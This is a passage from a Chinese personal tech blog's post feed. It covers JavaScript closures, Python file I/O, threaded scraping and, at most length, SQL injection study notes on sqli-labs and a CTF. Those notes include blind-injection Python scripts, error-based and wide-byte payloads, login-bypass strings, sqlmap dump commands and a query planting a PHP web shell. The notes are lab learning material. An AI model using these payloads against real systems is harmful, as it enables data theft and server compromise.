console.log(&quot;处理一下这个数据&quot; + data); return &quot;加密密文&quot; &#125; //直接返回一些函数 return &#123; rsa_jiami: function (data) &#123; data = process(data); console.log(&quot;我要开始rsa加密了，密钥是&quot; + key + &quot;,加密的密文是：&quot; + data); return &quot;加密好的字节&quot;; &#125;, aes_jiami: function (data) &#123; data = process(data); console.log(&quot;我要开始aes加密了，密钥是&quot; + key + &quot;,加密的密文是：&quot; + data); return &quot;加密好的字节&quot;; &#125;, sha1_jiami: function (data) &#123; data = process(data); console.log(&quot;我要开始sha1加密了，密钥是&quot; + key + &quot;,加密的密文是：&quot; + data); return &quot;加密好的字节&quot;; &#125;, md5_jiami: function (data) &#123; //ret = this.aes_jiami(data);//里面的函数可以互相调用 data = process(data); console.log(&quot;我要开始md5加密了，密钥是&quot; + key + &quot;,加密的密文是：&quot; + data); return &quot;加密好的字节&quot;; &#125;, &#125;&#125;)();miwen = jm.md5_jiami(&quot;胡辣汤&quot;);//可以直接用.进行调用返回的方法 用window建立一个全局变量窗口对象–&gt;全局变量 (nnn)创建一个全局变量–&gt;在闭包函数中向外界传递一些信息 12345678910function fn() &#123; let name = &quot;wusir&quot;; console.log(name);//打印name window.nnn = name;//将name赋值给nnn,nnn为全局变量&#125;fn()//调用完函数后，name将在函数调用后不复存在，他的值将被nnn保存下来nnn=&quot;lalala&quot;;//nnn为全局变量，可以在函数外部调用console.log(nnn)","categories":[{"name":"前端","slug":"前端","permalink":"http://zhoumuyun.com/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://zhoumuyun.com/tags/javascript/"}]},{"title":"sqli","slug":"sqli","date":"2024-01-02T01:21:02.000Z","updated":"2024-01-06T04:08:30.098Z","comments":true,"path":"2024/01/02/sqli/","link":"","permalink":"http://zhoumuyun.com/2024/01/02/sqli/","excerpt":"此篇介绍了sqli题目","text":"此篇介绍了sqli题目 第一题先输入一个？id&#x3D;1,看看什么情况 当输入id&#x3D;1’时，出现下面的语法错误 继续加上单引号，发现语法正确了，说明闭合位置就是 ‘ （单引号） 输入– -注释掉单引号后面的内容 用order by 找出列数，这里的列数是4 将前面的id设为-1，联合查询找到回显位置，为2，3，可以在2，3的位置上换上自己想要查询的语句 找出表名 找出列名 就可以找数据了 第二题找闭合 这里输入一可以正常显示 id&#x3D;1,看报错信息，后面是说明符号就是什么闭合 这里\\后面什么都没有就说明是数字型闭合 后面查询语句和前面一样 第三题这里用id&#x3D; 1\\的方法看出，闭合位是’) 第四题这里用id&#x3D;1\\的方法看出，闭合位置是”) 第五题判断闭合 这里的闭合是’ 这里没有任何回显位置，但是有报错语句，可以考虑用盲注或者报错 这里采用的是报错，报错后面加的关键词是and,这里的select user()可以换成自己想要执行的语句 可以报错 第六题这里监测出，闭合点是” 其他的和上一题思路一样 第七题这里没有错误信息显示，只会显示语法错误，通过尝试，查出他的闭合点’)) 因为这里只有错误和正确的回显 所以这里用盲注脚本去解决 这里调用payload去判断 payload &#x3D; url + f” and ascii(substr(user(),{i},1))&gt;{mid}– -“ 将user换成想要查询的语句 123456789101112131415161718192021222324252627282930import requestssession = requests.Session()#找出api,这个是注入的api,这个要找对，找不对没有值url = &quot;http://192.168.2.78/sqli/Less-7/?id=1&#x27;))&quot;def db_2(): name = &#x27;&#x27; for i in range(1, 50): start = 32 end = 128 mid = (start + end) // 2 while start &lt; end: payload = url + f&quot;/**/and/**/if(ascii(substr(user(),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&quot; print(payload) response = session.get(payload) if &#x27;You are in&#x27; in response.text: print(chr(mid)) start = mid + 1 mid = (start + end) // 2 else: end = mid mid = (start + end) // 2 if mid == 32: break name += chr(mid) print(name)db_2() 第八题1http://192.168.2.78/sqli/Less-8/?id=1&quot; 找出第八题的闭合 是双引号 其他的和第七题差不多 第九题无论id后面接什么都是you are in,回显没有变化 这里考虑用时间盲注 判断是否沉睡 1http://192.168.2.78/sqli/Less-9/id=1&#x27; and if(ascii(substr(user(),1,1))=114, sleep(3),0) --+ 发现有沉睡注入，这里考虑用时间注入 12345678910111213141516171819202122232425262728293031import requestsimport timesession = requests.Session()#找出api,这个是注入的api,这个要找对，找不对没有值url = &quot;http://192.168.2.78/sqli/Less-9/?id=1&#x27;&quot;def db_2(): name = &#x27;&#x27; for i in range(1, 50): start = 32 end = 128 mid = (start + end) // 2 while start &lt; end: payload = url + f&quot;/**/and/**/if(ascii(substr((select group_concat(id,username,password) from users ),&#123;i&#125;,1))&gt;&#123;mid&#125;,SLEEP(3),null)--+&quot; print(payload) start_time = time.time() response = session.get(payload) if (time.time() - start_time) &gt;= 3: print(chr(mid)) start = mid + 1 mid = (start + end) // 2 else: end = mid mid = (start + end) // 2 if mid == 32: break name += chr(mid) print(name)db_2() 时间盲注，数据出来的很慢 第十题和第9题解题思路一样 就是闭合由单引号换成了双引号 第十一题在表中输入admin,发现两个回显位 这里只有账号密码正确才会显示，这里我们用yakit进行抓包 找到回显位是’ 输入uname&#x3D;admin’ union select 1,2– -&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 找到两个回显位置 尝试把admin换成-1 uname&#x3D;-1’ union select 1,group_concat(username,password) from users– -&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 第十二题直接空字符提交，这里可以看到闭合位是”) 输入admin”)– -发现有正常回显 输入-1”)union select 1,2– - 发现有两个回显位置 直接在回显怼上查询语句 -1”) union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()– - -1”) union select 1,group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘users’ and table_schema&#x3D;database()– - -1”) union select 1,group_concat(id,username,password) from users limit 0,1– - 第十三题劫持到13题，admin用户登录的包 uname&#x3D;admin’&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 当我们在admin后面加’发现响应包里面有报错提示，这里我们考虑使用报错注入 uname&#x3D;admin’)– -&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 找到闭合是’) uname&#x3D;admin’)and (extractvalue(1,concat(0x7e,(select user()),0x7e)))– -&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 这里使用extractvalue，爆出user()名字","categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://zhoumuyun.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://zhoumuyun.com/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"sql注入","slug":"sql注入","date":"2023-12-25T03:27:18.000Z","updated":"2024-01-02T01:18:25.371Z","comments":true,"path":"2023/12/25/sql注入/","link":"","permalink":"http://zhoumuyun.com/2023/12/25/sql%E6%B3%A8%E5%85%A5/","excerpt":"此篇介绍了一些注入的不同方式，字符型注入，数字型注入，header注入，报错注入，cookies注入，sqlmap的使用","text":"此篇介绍了一些注入的不同方式，字符型注入，数字型注入，header注入，报错注入，cookies注入，sqlmap的使用 字符型注入注入逻辑 通过mysql爆数据的时候，MySQL库在5.0后才会出来information_schema 1.先判断闭合，看id后面的闭合是什么情况，有”)和”和”),让id闭合 id&#x3D;1,看报错信息，后面是说明符号就是什么闭合 2.找字段 order by 直接接在后面不用加union 3.查数据库 union select group_concat(schema_name) from information_schema.schemata – - 4.找出表格的名字 5.找到字段 6.就可以查询要找的内容 找闭合点 ?id&#x3D;1’ ?id&#x3D;1” 结果一：如果都报错 判断闭合符为：整形闭合。 结果二：如果单引号报错，双引号不报错。 继续尝试 ?id&#x3D;1’ –-+ 结果1：无报错 判断闭合符为：单引号闭合。 结果2：报错 判断闭合符可能为：单引号加括号。 结果三：如果单引号不报错，双引号报错。 继续尝试 ?id&#x3D;1” -–+ 结果1：结果无报错 判断闭合符为：双引号闭合。 结果2：报错 判断闭合符可能为：双引号加括号。 注意：这里的括号不一定只有一个，闭合符里是允许多个括号组合成闭合符的，具体要判段有多少个括号，可以使用二分法来快速判断。 注入原理select 1,2,3 出现三列数据 当要去匹配回显位的时候，可以在回显为插入自己想要运行的语句， 假如2是回显位 select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database() group_concat(table_name) 将多个数据放在一排，多行结果放在一行输出 information_schema.table 调出所有表的信息 意思：information_schema.tables information_schema的tables表下面 先找列数，然后找表名，再找字段名，然后查询查列数 order by 4可以按照列排序，去试出来每一行有多少列 找出表格的名字 select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() 找到字段的名字 select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() 这里的table_name是你要查询的表名 information_schema.columns是一个系统表，在information_schema的columns表里面，包含了数据库中所有表的列信息。 table_name&#x3D;’users’：这个条件表示只选择表名为’users’的记录。 table_schema&#x3D;database()：这个条件表示只选择当前数据库的表。database()函数返回当前数据库的名称。 查数据 select group_concat(id,username,password) from users 一些系统函数 database() ,user() 两个方法可以查询当前数据库 where table_schema&#x3D;database() 限制查询当前数据库 select @@basedir; 查路径 报错注入报错函数 (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) extractvalue(1,concat(0x7e,(select user()),0x7e)) updatexml(1,concat(0x7e,(select user())),1) geometrycollection((select * from(select * from(select user())a)b)) multipoint((select * from(select * from(select user())a)b)) polygon((select * from(select * from(select user())a)b)) multipolygon((select * from(select * from(select user())a)b)) linestring((select * from(select * from(select user())a)b)) multilinestring((select * from(select * from(select user())a)b)) exp(~(select * from(select user())a)) 经常使用的函数updatexml(1,concat(0x7e,(select user())),1) -1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)– - -1’ and updatexml(1,concat(0x7e,(select group_concat(username) from (select username from users)a)),1)# 显示更多的字符由于报错回显最多32位字符串，所以导致了回显不全的问题，我们可以利用字符串截断函数进行截断回显，这里我们使用mid函数，截断查询语句，从第32位开始查看回显31位字符串，也就是mid(SQL语句,32,31) -1’ and updatexml(1,concat(0x7e,mid((select group_concat(username) from (select username from users)a),32,32)),1) 现在直接从32开始到64开始 盲注用if(ascii(substr(database(),1,1))&gt;115,1,0)用这个函数去判断 函数解释123456789101112131415&#x27;&#x27;&#x27;http://192.168.2.70/sqli/Less-8/?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,0)-- -if判断对错，用and连接，如果都对就报you are in ascii 将里面的语句转化为ascii码，地址栏里面使用ascii码传数据substr(database(),1,1) 截取database()里面的第一个字符, database后面是的1是变量，这里的意思是查询第一个字符，可以将这个设为变量去变量每一个字符,第三个参数是长度&gt;&#123;mid&#125; 判断是否为大于，大于为ture,小于为false 这里可以设置为变量，去找出符合这个值的ascii码这里用的session就是每个页面都是相关联的如果文本中有you are in 就说明是正确的，就大于中间值，就将初始值改成中间值如果没有，就说明是小于，就将结束值改成中间值&#123;1&#125;,1,0) 用了if语句，如果是真的就返回第一个，如果是假的就返回第二个如果中间值等于32就说明比初始值还低，就直接退出循环找到所有满足条件的语句，将语句追加到namechr()函数是Python的内置函数，它可以将一个ASCII码转换为对应的字符 &#x27;&#x27;&#x27; 布尔盲注1234567891011121314151617181920212223242526272829303132import requestssession = requests.Session()#找出api,这个是注入的api,这个要找对，找不对没有值#可以f12里面可以找到url = &quot;http://4cd4bfb2-24b0-4483-83bf-bad37a9a29b5.challenge.ctf.show/api/v4.php?id=1&#x27;&quot;def db_2(): name = &#x27;&#x27; for i in range(1, 50): start = 32 end = 128 mid = (start + end) // 2 while start &lt; end: payload = url + f&quot;/**/and/**/if(ascii(substr(username(),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)--+&quot; #这里的username可以换成自己想要查询的语句 #更换语句的时候，记得在外面加括号 #其中(database())为子查询，需要加括号，如下图 response = session.get(payload) if &#x27;admin&#x27; in response.text: print(chr(mid)) start = mid + 1 mid = (start + end) // 2 else: end = mid mid = (start + end) // 2 if mid == 32: break name += chr(mid) print(name)db_2() 时间盲注12345678910111213141516171819202122232425262728293031import requestsimport timesession = requests.Session()#找出api,这个是注入的api,这个要找对，找不对没有值url = &quot;http://192.168.2.78/sqli/Less-9/?id=1&#x27;&quot;def db_2(): name = &#x27;&#x27; for i in range(1, 50): start = 32 end = 128 mid = (start + end) // 2 while start &lt; end: payload = url + f&quot;/**/and/**/if(ascii(substr((select group_concat(id,username,password) from users ),&#123;i&#125;,1))&gt;&#123;mid&#125;,SLEEP(3),null)--+&quot; print(payload) start_time = time.time() #增加了一个起始时间 response = session.get(payload) if (time.time() - start_time) &gt;= 3:#如果运行时间超过三秒，就说明判断成功 print(chr(mid)) #因为可能会有网络延迟，应该是&gt;=3 start = mid + 1 mid = (start + end) // 2 else: end = mid mid = (start + end) // 2 if mid == 32: break name += chr(mid) print(name)db_2() post注入12345678910111213141516171819202122232425262728293031323334353637383940414243import requestssession = requests.Session()url = &quot;http://192.168.2.59/sqli/Less-16/&quot;def db_2(): name = &#x27;&#x27; for i in range(1, 80): start = 32 end = 128 # 使用可打印的ASCII范围32到127 while start &lt; end: mid = (start + end) // 2 data = &#123; &quot;uname&quot;: f&#x27;-1&quot;) or if(ascii(substr((select group_concat(id,username,password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&#x27;, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot; &#125; response = session.post(url, data=data) # print(response.text) # print(len(response.text)) if &#x27;flag&#x27; in response.text: # 如果内容大于某个长度，假设SQL条件为真 start = mid+1 else: end = mid # 调试输出来理解过程 print(f&quot;测试位置 &#123;i&#125;, 字符ASCII: &#123;mid&#125;, start = &#123;start&#125;, end = &#123;end&#125;&quot;) # 循环结束后需要重新设置mid点 mid = (start + end) // 2 found_char = chr(mid) if mid == 32: # 如果ASCII是32（空格），可能表示结束 break name += found_char print(f&quot;找到的字符: &#123;found_char&#125;, 目前的数据库名称: &#123;name&#125;&quot;) print(f&quot;最终数据库名称: &#123;name&#125;&quot;)db_2() 宽字节注入 这里以sqli-lib-32关为例 mysql默认是GBK编码，BGK汉字编码，两个字节代表一个汉字，一个字节代表一个英文或者数字 那么，两个字节就是宽字节，一个字节就是窄字节 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 漏洞出现原因mysql默认使用BGK编码，当mysql使用bgk编码时，会认为两个字符是一个汉字，(前一个ASCII码要大于128，才会得到汉字范围)，这就是mysql的特性，因为BGK是多字节编码，它认为两个字节是一个汉字，我们在代入参数时，代入 %df%27，%27 是 单引号 的url编码 123456789101112131415161718192021# 当 我们进行 SQL注入时，会进行一下操作 （1）?id=1&#x27; and 1=1%23 # 这是正常的语句，我们不放使用SQL语句看一下 select * from user where id=&#x27;1&#x27; and 1=1#&#x27; # 当php使用函数对接受的参数做了处理后，将单引号转义，在单引号前面加上了 转义符“\\&quot; 在sql中的语句是： select * from user where id=&#x27;1\\&#x27; and 1=1#&#x27; # 这时代入数据库查看,这是明显没有注入成功的，因为前面的单引号没有闭合 (2) 当我们代入了 %df 时，在数据库中就变成了 ?id=1%DF&#x27; and 1=1%23 这时，转义函数，还会对我们输入的单引号进行转义，转义成（\\&#x27;）,而&quot;\\&quot;的url编码为 %5C 在url中就变成了：%DF%5c%27 当编码为bgk时，%5c会和前面的%df拼合，形成一个汉字（運） 从而闭合掉了后面的引号，查询成功 最后的sql语句是： select * from user where id=&#x27;1運&#x27; and 1=1#&#x27; 漏洞出现的条件 mysql使用了BGK编码 php对传入的参数进行了转义 sqli靶场测试12345# 首先了解PHP函数mysql_real_escape_string()mysql_escape_string()addslashes()magic_quotes_gpc() 测试注入点正常页面： 测试注入点 输入单引号测试注入点 ?id&#x3D;1’ 发现把单引号给我们注释掉了 单引号被注释掉了，这是我们思路应该是，使用编码绕过，或者宽字节 首先试用编码绕过吧！！ 毕竟刚开始学习，多走些弯路，总结经验，还是好的！！ 发现并没有什么用，1&#x3D;1 的时候 还是报错 开始使用宽字节注入： 12345678?id=1%DF&#x27;输入%DF页面报错，现在的sql语句是select * from user where id=&#x27;1%df\\&#x27;&#x27;select * from user where id=&#x27;1%df%5c&#x27;&#x27;最后带入查询的是：select * from user where id=&#x27;1運&#x27;&#x27; header注入 Header简介什么是Header头？ 通常HTTP消息包括客户机向服务器的请求消息和服务器向客户机的响应消息。这两种类型的消息由一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成。HTTP的头域包括通用头，请求头，响应头和实体头四个部分。每个头域由一个域名，冒号（:）和域值三部分组成。域名是大小写无关的，域值前可以添加任何数量的空格符，头域可以被扩展为多行，在每行开始处，使用至少一个空格或制表符。cookie也属于header头。 123456789101112131415GET / HTTP/1.1Host: www.baidu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1 Header注入原理什么是Header注入？ Header注入，该注入是指利用后端验证客户端口信息（比如常用的cookie验证）或者通过Header中获取客户端的一些信息（比如User-Agent用户代理等其他Header字段信息），因为这些信息在某些地方是会和其他信息一起存储到数据库中，然后再在前台显示出来，又因为后台没有进过相对应的信息处理所以构成了sql注入。 引入知识： 超全局变量 PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。这些超全局变量是： $_REQUEST （获取GET&#x2F;POST&#x2F;COOKIE） COOKIE在新版本已经无法获取了 $_POST （获取POST传参） $_GET (获取GET的传参) $_COOKIE （获取COOKIE的值） $_SERVER （包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组） $_SERVER 常用方法： $_SERVER[‘HTTP_HOST’] 请求头信息中的Host内容，获取当前域名。 $_SERVER[“HTTP_USER_AGENT”] 获取用户相关信息，包括用户浏览器、操作系统等信息。 $_SERVER[“REMOTE_ADDR”] 浏览网页的用户ip。 updatexml()函数 updatexml() 更新xml文档的函数 语法：updatexml(目标xml内容，xml文档路径，更新的内容) 接下来会有单独文章介绍报错函数 updatexml(1,concat(0x7e,(SELECT database())),1) 实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了 但是报错的时候他其实已经执行了那个子查询代码！注意：必须使用concat函数拼接一个特殊字符才会报错，如下图 cookies注入cookies注入也在header注入里面但是，但是cookies注入需要转码 找到index.php的包 当把除了cookies以下的包头都删除，发现没有什么差别 尝试在cookies上面进行传参 查询后，才知道cookies是经过js传参的,编码是basea64 把查询语句直接放在base64转码 -1’and updatexml(1,concat(0x7e,mid((select group_concat(username) from (select username from users)a),32,32)),1) or’ LTEnYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLG1pZCgoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSkgZnJvbSAoc2VsZWN0IHVzZXJuYW1lIGZyb20gdXNlcnMpYSksMzIsMzIpKSwxKSBvcic&#x3D; 将编码直接复制到uname上面，直接就可以查询 万能语句一般闭合1 or 1&#x3D;1 – # 1) or 1&#x3D;1– # 1)) or 1&#x3D;1– # 1’ or 1&#x3D;1 – # 1’) or 1&#x3D;1– # 1’) or 1&#x3D;1– # 1” or 1&#x3D;1 – # 1”) or 1&#x3D;1– # 1”) or 1&#x3D;1– # post型一般POST型使用1’ or 1&#x3D;1 – #和1” or 1&#x3D;1 – # 成功的概率最大因单双引号引起的闭合问题更大点 猜数据库第一位利用二分法(特别提醒这里的逻辑运算符要用 or) uname&#x3D;1’ or left(database(),1)&gt;’a’ – #&amp;passwd&#x3D;1 返回正确 uname&#x3D;1’ or left(database(),1)&gt;’s’ – #&amp;passwd&#x3D;1 返回错误 uname&#x3D;1’ or left(database(),1)&#x3D;’s’ – #&amp;passwd&#x3D;1 返回正确 常见判断语句：‘ or if(1,1,sleep(5)) – # “ or if(1,1, sleep(5)) – # ) or if(1,1, sleep(5)) – # ‘) or if(1,1, sleep(5)) – # “) or if(1,1, sleep(5)) – # （PS：如果不能闭合，select语句会直接报错） 猜数据库长度：(再次强调&amp;passwd&#x3D;1不能少，因为后台源码中设置uname和passwd这两个参数任何一个都不能为空，一旦其中一个为空将不会执行SQL语句） uname&#x3D;1’ or if(length(database())&#x3D;x,1,sleep(5))– #&amp;passwd&#x3D;1，x从4开始增加，增加到8有明显的延迟，说明数据库的长度是8； uname&#x3D;1&amp;passwd&#x3D;1’ or if(length(database())&#x3D;8,1,sleep(5))– # 参数污染12345678910?pusa&amp;pchina2 百度13 雅虎24 google 1+25 php/apache 26 flask 17 jsp/tomcat 18 cgi/apache 19 python/apache 1+210 asp/is 简单后门但当你查数据出现null,说明没有权限，留不了后门 如果配置文件里面有 添加最高权限secure_file_priv&#x3D;”” 1http://192.168.2.59/sqli/Less-1/?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]); ?&gt;&quot; into outfile &quot;C:\\\\phpstudy_pro\\\\WWW\\\\phpinfo.php&quot; -- - 1http://192.168.2.59/sqli/Less-1/?a= 可以进行操纵 sqlmap python sqlmap.py -u “http://192.168.2.78/sqli/Less-1/?id=1“ –dbs –batch python sqlmap.py -u “http://192.168.2.70/sqli/Less-1/?id=1“ –batch -D security -T users -C “id,username” –dump python sqlmap.py -r ..&#x2F;1.txt –batch –risk&#x3D;3 –level&#x3D;3 –dbs 1.txt是发的包，..&#x2F;是上一级 SQLMap 使用说明笔记 基础命令: sqlmap.py 主程序 基本选项: -h, –help 显示简短帮助信息并退出 -hh 显示完整帮助信息并退出 –version 显示程序的版本号并退出 -v VERBOSE 设置详细级别（0至6，默认为1） 目标定义: -u URL, –url&#x3D;URL 设置目标URL（例：”http://www.site.com/vuln.php?id=1&quot;） -g GOOGLEDORK 使用Google dork结果作为目标URL 请求参数: –data&#x3D;DATA 发送POST数据（例：”id&#x3D;1”） –cookie&#x3D;COOKIE 设置HTTP Cookie值（例：”PHPSESSID&#x3D;a8d127e..”） –random-agent 使用随机用户代理 –proxy&#x3D;PROXY 设置使用的代理（例：”","categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://zhoumuyun.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://zhoumuyun.com/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"python的文件操作","slug":"python的文件操作","date":"2023-12-25T03:20:09.000Z","updated":"2023-12-25T03:25:19.288Z","comments":true,"path":"2023/12/25/python的文件操作/","link":"","permalink":"http://zhoumuyun.com/2023/12/25/python%E7%9A%84%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","excerpt":"此篇介绍了python的文件操作","text":"此篇介绍了python的文件操作 python文件操作打开文件：open(文件路径,mode&#x3D;””,encoding&#x3D;””)文件路径：绝对路径 d:&#x2F;test&#x2F;xxx.txt相对路径 相对于当前程序所在的文件夹..&#x2F;上一层文件夹打开文件模式mode:r:read “读取 content &#x3D; f.read() 全部读取 line &#x3D; f.readline() 读取一行 但是读取的语句有换行，每句话和每句话之间有空格 line &#x3D; f.readline().strip() 可以用strip方法去掉字符串两端的空白，如空格、换行、制表符 for line in f: print(line.strip())从f中读取到每一行数据 w:write “写入” 如果文件不存在，会自动创建文件 每一次open都会清空 f.write(“1”) 写入1，覆写 f.close 每次操作之后要养成好习惯，要关闭连接 123456789lst = [&quot;中国&quot;, &quot;英国&quot;, &quot;美国&quot;, &quot;德国&quot;, &quot;法国&quot;]f = open(&quot;国家.txt&quot;, mode=&quot;w&quot;, encoding=&quot;utf-8&quot;)#打开文件的操作尽量卸载循环外面for item in lst: f.write(item) f.write(&quot;\\n&quot;)#\\n换行f.close#打开文件后要习惯性关闭 f.append(“1”) 追加f.append(“1”) 追加1 b:读写的是非文本文件with:上下文，不需要主动取关闭文件123456789101112131415with open(&quot;国产自拍.txt&quot;,mod=&quot;r&quot;,encoding = &quot;utf-8&quot;)as f:#下面的内容就是将f打开，在下面继续操作 for line in f: print(line.strip()) #文件会自动关闭，不需要f.close()#读取照片with open(&quot;1.jpg&quot;,mode=&quot;r&quot;) as f:# for line in f: print(line)#文件的复制#从源文件中读取内容，写入新路径取with open(&quot;1.jpg&quot;,mode=&quot;rb&quot;) as f1 ,\\ # \\表示这一行和下一行是同一行 open(&quot;../tupian/2.jpg&quot;,mode = &quot;w&quot;) as f2: for line in f1: f2.write(line)","categories":[{"name":"python笔记","slug":"python笔记","permalink":"http://zhoumuyun.com/categories/python%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"异步爬虫","slug":"异步爬虫","date":"2023-12-25T03:09:43.000Z","updated":"2023-12-25T03:18:27.964Z","comments":true,"path":"2023/12/25/异步爬虫/","link":"","permalink":"http://zhoumuyun.com/2023/12/25/%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB/","excerpt":"#此篇介绍了爬虫多线程的基础和一些实例","text":"#此篇介绍了爬虫多线程的基础和一些实例 多线程和多进程 什么是进程，什么是线程 进程：运行中的程序，每次我们执行一个程序，咱们的操作系统对自动的这个程序准备一些必要的资源（例如分配内存、创建一个能够执行的线程） 线程：程序内，可以直接被cpu调度的执行过程，是操作系统能否进行运算调度的最小单位，他被包含在进程之中，是进程中的实际运作单位 多线程 多进程 当这个程序运行起来的时候，此时有四个线程，一个主线程和三个副线程 多线程简单实例1234567891011121314151617from threading import Threaddef func(name): for i in range(1000): print(name,i)#单线程的方法# if __name__ == &#x27;__main__&#x27;:# func(&quot;周杰伦&quot;)# func(&quot;周星驰&quot;)# func(&quot;周润发&quot;)if __name__ == &#x27;__main__&#x27;: t1 = Thread(target=func,args=(&quot;周杰伦&quot;,))#target后面跟着的是函数名字 t2 = Thread(target=func,args=(&quot;周星驰&quot;,)) t3 = Thread(target=func,args=(&quot;周润发&quot;,)) t1.start() t2.start() t3.start() 123456789101112131415161718#自己写个类，继承父类，重写run方法class MyThread(Thread):#继承 def __init__(self, name):#通过init传递参数 super(MyThread, self).__init__() ##初始化父类对象 self.name = name def run(self):#重写run方法 for i in range(1000): print(self.name, i)if __name__ == &#x27;__main__&#x27;: t1 = MyThread(&quot;周杰伦&quot;) t2 = MyThread(&quot;周星驰&quot;) t3 = MyThread(&quot;周润发&quot;) t1.start() t2.start() t3.start() 线程池 线程池，把线程放在一个线程池里面，保证每次都有几个线程同时进行，当有单独一个线程完成后，后面线程池里面的线程会接上，保持住一直有这么多线程同时运行 12345678from concurrent.futures import ThreadPoolExecutordef func(name): for i in range(10): print(name,i)if __name__ == &#x27;__main__&#x27;: with ThreadPoolExecutor(10) as t: #10个线程一起在跑 for i in range(1000): #循环了1000个线程，每次跑十个 t.submit(func,f&quot;周杰伦&#123;i&#125;&quot;) #提交任务，第一个参数是函数，第二个参数是函数的参数 callback和map返回值的区别 123456789101112131415161718192021222324252627282930313233343536from concurrent.futures import ThreadPoolExecutorimport timedef func(name, t): time.sleep(t) print(&quot;我是&quot;, name) return namedef fn(res): print(res.result()) # 必须用result方法才能获取线程的返回值if __name__ == &#x27;__main__&#x27;: with ThreadPoolExecutor(3) as t: # 三个线程一起在跑 t.submit(func, &quot;周杰伦&quot;, 2).add_done_callback(fn) # add_done_callback是回调函数，当线程执行完后，会自动调用回调函数 t.submit(func, &quot;王力宏&quot;, 3).add_done_callback(fn) # 线程执行完后 t.submit(func, &quot;王杰&quot;, 4).add_done_callback(fn) t.submit().add_done_callback() 返回及执行， callback函数 # 返回callback的顺序是不确定的，返回值的顺序是不确定的，谁先结束谁就执行 # 我是 周杰伦 # 周杰伦 #线程执行完后返回了值 res = t.map(func, [&quot;周杰伦&quot;, &quot;王力宏&quot;, &quot;王杰&quot;], [2, 1, 4]) # 把列表里面的每一项都单独进行匹配，组装成一个任务 这里是（func,&quot;周杰伦&quot;，2）成为一个线程 # map() 方法返回的是一个迭代器，迭代器是惰性序列，只有在需要返回值的时候才会计算 # 返回值是列表，列表里面是元组，元组里面是返回值 for i in res: # map返回值是确定的 print(i) # 我是 王力宏 # 我是 周杰伦 # 周杰伦 #返回值是周杰伦、王力宏、王杰，和任务分发的顺序是一样的 # 王力宏 # 我是 王杰 # 王杰 返回callback的顺序是不确定的，返回值的顺序是不确定的，谁先结束谁就执行 map返回值是确定的，map() 方法返回的是一个迭代器，迭代器是惰性序列，只有在需要返回值的时候才会计算返回值是列表，列表里面是元组，元组里面是返回值，是一个数据嵌套 多线程实操 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import requestsfrom lxml import etreeimport osimport timefrom concurrent.futures import ThreadPoolExecutortime.sleep(1)header = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&quot;&#125;# 获取htmldef get_html(url): &quot;&quot;&quot; Returns the content of a URL &quot;&quot;&quot; response = requests.get(url, headers=header) response.encoding = &quot;utf-8&quot; html = response.content return html# 搜索，全部搜索结果urldef searcher_url(word, i): urls = [] for it in range(1, i): url = f&quot;https://wallhaven.cc/search?q=&#123;word&#125;&amp;page=&#123;it&#125;&quot; urls.append(url) return urls # 返回一个列表，里面有每一页搜索的数据# 解析网页代码，获得图片urldef get_image_url(html): et = etree.HTML(html) uls = et.xpath(&#x27;//*[@id=&quot;thumbs&quot;]/section/ul&#x27;) imgs = [] for li in uls: img_urls = li.xpath(&#x27;./li/figure/img/@data-src&#x27;) for it in img_urls: lian = it.split(&quot;/&quot;)[-1] tou = lian[:2] img_url = 